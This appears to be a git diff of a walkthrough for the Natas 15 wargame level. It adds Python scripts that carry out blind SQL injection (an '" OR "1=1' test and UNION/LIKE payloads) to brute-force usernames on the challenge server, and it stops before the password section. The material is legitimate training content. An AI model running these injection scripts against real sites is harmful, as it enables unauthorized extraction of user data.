@@ -1,19 +1,21 @@
 # Natas 15 walkthrough
 As always, we first introduce our credentials, and the first thing we see is this:
-![alt text](images/front-end.png)
-We see a form, that ask us to introduce an username, and then when we click the check existence button to send the post request. Lets try to introduce a random name, like 'username'
-![alt text](images/image1.png)
+![alt text](media/front-end.png)
+We see a form, that ask us to introduce an username, and then when we click the check existence button to send the post request. Lets try to introduce a random name, like "username".
+
+![alt text](media/image1.png)
 We get redirected to the following page 
-![alt text](images/image2.png)
+![alt text](media/image2.png)
+
 An as a result, the we see the text "This user doesn't exist.", this will be useful later in the script. 
 So from what we have gathered by now, we can guess that if we put an username that exists, maybe the text that appears will be different.
 
 Still we don't have much information, so we will see the source code.
-![alt text](images/source_code.png) 
+![alt text](media/source_code.png) 
+
 And looking at it, we see two important things, someone left the schema of the database in a comment, and we see that they are using a query. And another thing that is useful that we have a debug variable that we can add in the request, so we can see the query generated. 
 
-To solve this problem, we can divide it the following parts: Code injection, finding the usernames, 
-finding the password.
+To solve this problem, we can divide it the following parts: Code injection, finding the usernames, finding the password.
 
 ## Code Injection
 
@@ -31,6 +33,63 @@ def test_code_injection():
         print(f"look we injected code!")
 ```
 I set the debug variable to true, because it's helpful, and used an old friend (" OR "1=1) to verify if it's possible to inject code, and also left a print of the content, because when I was trying to write our old friend, I've made a lot of syntaxs errors, so it did not worked out at the first try hahaha. And it finally worked as you can see in this output.
-![alt text](images/output.png)
+![alt text](media/output.png)
 
 ### Creating the query
+
+If we thing about the restrictions of the problem, we can see that we can not know the specifics values of the columns in the database, so the first question is, **how can we guess them?** And so while I was thinking on this, I did a little research on how to do queries, and found something very useful, and it is the LIKE keyword and using it with the % operator, we can do brute force to guess how does the values stored in the database are written. And also needed to use the JOIN keyword, so we can use the things mentioned before. And why we have to guess it? Because of the information that the page is giving us, we can only know when we are on the right track by seeing the content displayed in the page that says "This user exists."
+So finally, the injected code will look like this:
+
+<span style="color: #FF5F0F;">" UNION SELECT * from users WHERE username LIKE "<random_char>%</span>
+
+I used the UNION keyword, because that's the way I found that I can be guessing the values stored in the database and felt more comfortable, maybe there is another way.
+
+## Finding the usernames
+We need to find first the usernames, because in this way, when we want to obtain the password of any username, we can shorten the guess for the password. So we are going to use injection created before in order to guess with which character does all the usernames start with, why? Because the brute force will be shorten, and we don't have to try all the possible combinations of characters. And also, after we find the firsts characters of every username, we have to know their full name.
+```python
+#This function find the first initial character of the usernames stored in the database
+def get_start_char(characters):
+    start_char = []
+    for char in characters:
+        print(f"trying with {char}")
+        payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+char+"%" }
+        r= session.post(url,auth=(username, password),data=payload)
+        if b"This user exist" in r.content:
+            print(f"we found the following character {char}")
+            start_char.append(char)
+    return start_char
+              
+#Function to obtain the usernames stored in the database
+def obtain_usernames(username,password,session,url):
+    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
+    contador = 0
+    #['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']
+    start_users = get_start_char(characters)
+    full_name = []
+    for user_to_find in start_users:
+        while True:
+            if contador == len(characters)-1:
+                full_name.append(user_to_find)
+                contador=0
+                break
+            print(f"trying with {user_to_find}{characters[contador]}")
+            test = user_to_find+ characters[contador]
+            payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+test+"%" }
+            r= session.post(url,auth=(username, password),data=payload)
+            if b"This user exist" in r.content:
+                print(f"We've got a match with {characters[contador]}")
+                user_to_find +=characters[contador]
+                contador=0
+            contador+=1
+    print(f"The users are \n: {full_name}")
+    return full_name
+```
+<figure>
+    <video width="320" height="240" controls>
+        <source src="media/video_get_names.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <figcaption>Video showing brute force of the usernames</figcaption>
+</figure>
+
+
